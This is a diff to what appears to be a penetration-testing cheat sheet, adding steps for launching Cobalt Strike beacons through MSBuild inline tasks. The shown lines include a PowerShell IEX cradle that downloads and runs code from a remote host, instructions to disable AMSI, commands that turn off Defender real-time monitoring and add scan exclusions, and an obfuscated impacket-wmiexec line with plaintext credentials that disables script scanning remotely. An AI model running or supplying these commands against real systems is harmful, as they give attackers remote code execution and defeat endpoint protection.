@@ -58,13 +58,20 @@ Password Crack Examples
   HASHCAT: Hashcat -a0 -w3 -m1000 /path/to/hashes /path/to/dictionary [-r rules file]
     * a = dictionary attack; w3 = almost all processing hardware; m = hash type - 1000 is NTLM
 
-Initial Beacon
-  MSBuild:
+MSBuild Beacon
+  MSBuild 3gStudent:
     Download XML from: https://github.com/3gstudent/msbuild-inline-task
     Generate Shellcode from Cobalt (C#) and place the shellcode in the XML from new_byte...};
     C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe \\host.domain\path\to\XMLfile.xml
   Powershell IEX
     "powershell iex (new-object net.webclient).downloadstring('http://10.10.10.10/update')"
+    
+  MSBuild NPS 
+    Genereate XML using script from https://github.com/trustedsec/nps_payload
+    Create cobalt listener
+    Disable AMSI on target
+    Upload XML to target or Run XML from File Server
+    Execute %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe c:\windows\temp\msbuild_nps.xml
 
 Overpass the Hash
   dcsync fqdn domain\user (User must have DCSync rights in that domain)
@@ -246,8 +253,8 @@ Windows Commands
       Powershell Set-MpPreference -DisableRealtimeMonitoring $true ($false turns it on)
       Powershell Add-MpPreference -ExclusionPath "C:\Temp" (Excludes a folder)
       Powershell Set-MpPreference -DisableScriptScanning 1 (Disable AMSI; set to 0 to enable)
-        impacket-wmiexec Administrator:'password'@10.10.10.10 "Powershell.exe .('{3}{2}{4}{1}{0}'-f 'e','nc','Prefe','Set-Mp','re') -DisableScriptScanning 1"
-  
+        Example: impacket-wmiexec Administrator:'password'@10.10.10.10 "Powershell.exe .('{3}{2}{4}{1}{0}'-f 'e','nc','Prefe','Set-Mp','re') -DisableScriptScanning 1"
+      
   Opens Powershell as Administrator
       Start-Process PowerShell -Verb RunAs
 
